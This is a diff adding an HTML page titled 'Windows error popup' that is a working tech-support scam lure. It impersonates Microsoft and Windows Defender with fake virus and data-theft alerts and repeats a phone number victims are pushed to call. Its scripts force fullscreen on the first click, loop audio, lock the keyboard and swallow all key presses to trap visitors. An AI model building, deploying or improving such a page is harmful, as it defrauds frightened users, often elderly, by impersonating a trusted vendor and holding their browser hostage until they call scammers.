@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+
+
+        <script type="text/javascript">
+            /* eslint-disable */
+            if (top !== self) top.location = self.location;
+
+        </script>
+
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Windows error popup</title>
+	<link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700&amp;display=swap" rel="stylesheet">
+    <link href="css/style-browser-reset.css" rel="stylesheet">
+	<link href="css/style.css" rel="stylesheet">
+	<style>
+	 #popup-img{
+		height:999px;
+		z-index:9999;
+	    background-image:url("2014.jpg");
+        background-size:100% 100%;
+	 }
+	 #popup-img img{
+	      width:100%;
+		  height:900px;
+	 }
+	  #popup-img .bn{
+	   margin-left:95px;
+	   position:relative;
+	   top:513px;
+	   left:300px;
+	   width: 164px;
+      height: 61px;
+	 }
+	 #popup-img #second{
+	  position:relative;
+	  left: 515px;
+      top: 450px;
+	  background-color:red;
+	 }
+	 .cssbuttons-io-button {
+  background: #07b107;
+  color: white;
+  font-family: inherit;
+  padding: 0.35em;
+  padding-left: 1.2em;
+  font-size: 24px;
+  font-weight: 500;
+  border-radius: 0.9em;
+  border: none;
+  letter-spacing: 0.05em;
+  display: flex;
+  align-items: center;
+  box-shadow: inset 0 0 1.6em -0.6em #714da6;
+  overflow: hidden;
+  position: relative;
+  height: 2.8em;
+  padding-right: 3.3em;
+}
+
+.cssbuttons-io-button .icon {
+  background: white;
+  margin-left: 1em;
+  position: absolute;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 2.2em;
+  width: 2.2em;
+  border-radius: 0.7em;
+  box-shadow: 0.1em 0.1em 0.6em 0.2em #7b52b9;
+  right: 0.3em;
+  transition: all 0.3s;
+}
+
+.cssbuttons-io-button:hover .icon {
+  width: calc(100% - 0.6em);
+}
+
+.cssbuttons-io-button .icon svg {
+  width: 1.1em;
+  transition: transform 0.3s;
+  color: #7b52b9;
+}
+
+.cssbuttons-io-button:hover .icon svg {
+  transform: translateX(0.1em);
+}
+
+.cssbuttons-io-button:active .icon {
+  transform: scale(0.95);
+}
+
+	</style>
+	<script>
+	    function hide(){
+		     el=document.getElementById("popup-img");
+			 el.style.display="none";
+		}
+	</script>
+</head>
+<body onload="playAudio()">
+	
+
+    <audio id="my_audio" src="takashi.mp3" loop="loop"></audio>
+	
+	<main class="main" id="fullscreen">
+	   <div id="popup-img" onclick="hide()">
+	       <div>
+	
+			 <button class="cssbuttons-io-button bn"> Enter
+  <div class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"></path><path fill="currentColor" d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"></path></svg>
+  </div>
+</button>
+		     <button class="cssbuttons-io-button bn" id="second"> Exit
+  <div class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"></path><path fill="currentColor" d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"></path></svg>
+  </div>
+</button>
+			
+			 </div>
+	</div>
+		<div id="banner_chat" class="banner chat">
+			<img src="img/icon-chat.png" alt="">
+			<span class="banner_chat_label">Contact support</span>
+			<span class="banner_chat_tel">+1-818-275-4585</span>
+			<span class="banner_chat_contact">(Toll Free Number)</span>
+		</div>
+
+
+		<div id="banner1" class="banner banner1">
+			<div class="main-btn">
+				<button class="btn skip"><img src="img/skip.svg" alt=""></button>
+				<button class="btn close"><img src="img/close.png" alt=""></button>
+			</div>
+			<div class="wrapper">
+				<div class="wrapper-header">
+					<span>Microsoft-Windows-Virus-Alert +1-818-275-4585</ span>
+				</div>
+				<div class="wrapper-main">
+					<div class="wrapper-main-img">
+						<img src="img/comp.png" alt="">
+				    </div>
+				    <div class="wrapper-main-detail">
+				    	<div class="wrapper-main-detail-title">
+				    		You will be protected
+				    	</div>
+				    	<label>Protection update <span>flow</span></label>				    		
+				    	<label>Last scan <span class="sf-main-color">You can not use it</span><span>| Quick scan</span></label>
+				    	<label>License to use <span>1/5</span><span>| Another device</span></label>		
+				    </div>
+				</div>	
+
+
+				<div class="wrapper-selection">
+						<div class="item item-1 active">
+							<label>Security</label>
+							<img src="img/comp-min.png" alt="">
+							<span>invalid</span>
+						</div>
+						<div class="item item-2">
+							<label>identity</label>
+							<img src="img/world-min.png" alt="">
+							<span>At risk</span>
+						</div>
+						<div class="item item-3">
+							<label>Performance</label>
+							<img src="img/speed-min.png" alt="">
+							<span>Optimized</span>
+						</div>
+						<div class="item item-4">
+							<label>Fire wall</label>
+							<img src="img/microsoft-min.png" alt="">
+							<span>Turn off</span>
+						</div>
+				</div>
+
+				<div class="wrapper-footer">
+					<label>status :<span>For risk on PC </span></label>
+				</div>		
+
+			</div>	
+
+		</div>
+	 	
+
+
+	 	<div id="banner2" class="banner banner2">
+	 		<div class="main-btn">
+				<button class="btn skip"><img src="img/skip.svg" alt=""></button>
+				<button class="btn close"><img src="img/close.png" alt=""></button>
+			</div>
+			<div class="wrapper">
+			     <div class="wrapper-header">
+					<span>Quick scan</span>
+					<label>Scanning common infection area startup file</label>
+					<label>C:WindowsSystem32sihost.exe</label>
+				</div>
+				<div class="wrapper-table">
+							<div class="wrapper-table-title">
+								Summary of results
+						    </div>
+						    <div class="wrapper-table-item">
+						    	<span class="wrapper-table-item-text">[+]Total items scanned:</span>
+						    	<span class="wrapper-table-item-number">218</span>
+						    </div>
+
+						    <div class="wrapper-table-item">
+						    	<span class="wrapper-table-item-text">[+]Total security risk detection: </span>
+						    	<span class="wrapper-table-item-number">0</span>
+						    </div>
+
+						    <div class="wrapper-table-item">
+						    	<span class="wrapper-table-item-text">[+] Comprehensive security risk resolution:</span>
+						    	<span class="wrapper-table-item-number">0</span>
+						    </div>
+
+						    <div class="wrapper-table-item">
+						    	<span class="wrapper-table-item-text">Security risks that need attention:</span>
+						    	<span class="wrapper-table-item-number">0</span>
+						    </div>
+					
+				</div>
+
+				<div class="wrapper-buttons">
+					<button class="btn">pause</button>
+				    <button class="btn">stop</button>
+				</div>
+
+
+			</div>
+	 	</div>
+		
+
+		<div id="banner3" class="banner banner3">
+                <div class="wrapper">
+                     <div class="wrapper-title">
+                     	Windows-Defender-Security notice
+                	 </div>
+                	 <div class="wrapper-text">
+                	 	<span>** Access is the block security reason for this computer **</span>
+						<span>Your computer counts it as Trojan spyware
+						The following data has been compromised.</span>
+						<ul class="wrapper-text-list">
+							<li>> Email person credentials</li>
+							<li>> It's a bank Seward</li>
+							<li>> Facebook</li>
+							<li>> Photo quality</li>
+						</ul>
+						<span>Windows-Defender_ScanCan steal your password
+						Discovered potentially unwanted adware on your device, on-latein id goods
+						Personal information personal file</span>
+
+						<span>Our engineers can walk by telephone removal process
+						Please contact us immediately</span>
+
+						<span>コWindowsAssistance Theft and lock resolution to prevent immediate reporting
+						It is temporary to remove access。</span>
+
+						<span>Closing this window puts your personal information at risk
+						WindowsRegistration will be suspended.</span>
+
+						<span>Windows Contact support:+1-818-275-4585</span>
+                	 </div>
+
+			        <div class="wrapper-buttons">
+						<button class="btn">cancel</button>
+					    <button class="btn btn-ok">OK</button>
+					</div>
+
+				 </div>
+           
+		</div>
+		
+		<div id="banner4" class="banner banner4">
+            <div class="main-btn">
+				<button class="btn skip"><img src="img/skip.svg" alt=""></button>
+				<button class="btn close"><img src="img/close.png" alt=""></button>
+			</div>
+			 <div class="wrapper">
+			 	<div class="wrapper-icon-microsoft">
+			 	<div class="wrapper-icon">
+			 		<img src="img/microsoft-label.png" alt="">
+					
+			    </div>
+			</div>
+			 	<div class="wrapper-main">
+			 		<div class="wrapper-main-title">
+			 			WindowsFirewall
+			        </div>
+			        <div class="wrapper-main-text">
+			 			<label class="wrapper-main-text-alert">Virus_Alert-Error code: ValveDW6BD36</label>
+			 			<label class="wrapper-main-text-adress">Windows Access is block due to security reason for this computer.</label>
+			 			<label class="wrapper-main-text-tel">WindowsConnect to support:+1-818-275-4585</label>
+			        </div>
+			    </div>
+
+			     <div class="wrapper-footer">
+			        	<div class="wrapper-footer-text">
+			        		<span>Blue Wei was detected-Virus SPywgre</span>
+			        		<span>So: Ads.financetrack(1).exe</span>
+			            </div>
+
+			         <div class="wrapper-buttons">
+						<button class="btn">Quick support</button>
+					    <button class="btn btn-right">Return to safety</button>
+					</div>
+
+			     </div>	
+			 </div>	
+		</div> 
+		
+    </main> 
+	 
+</body>
+  <script src="jquery.min.js"></script>
+  <script type="text/javascript">
+    	var fullscreen = document.getElementById("fullscreen");
+    	var el = document.documentElement;
+    	fullscreen.addEventListener("click", ()=>{
+    		if (el.requestFullscreen){
+    			el.requestFullscreen()
+    		}
+    	})
+    	
+    	var clickBody = document.getElementById("fullscreen");
+    	var my_audio = document.getElementById("my_audio");
+		clickBody.addEventListener("click", ()=>{
+				my_audio.play();
+		})
+
+  var currentDiv = $("#banner_chat");
+	var nextDiv, count = 1;
+	var myInterval = setInterval(function() {
+  if (count == 5) {
+   
+    currentDiv = $("#banner_chat");
+    currentDiv.show();
+    count = 1;
+  } else {
+    count++; 
+    currentDiv = currentDiv.next();
+    currentDiv.show();
+  }
+}, 1000);
+
+   </script>
+   
+   
+   <script>
+    navigator.keyboard.lock();
+    document.onkeydown = function (e) {
+    return false;
+    }
+</script>
+   
+   
+
+</html>
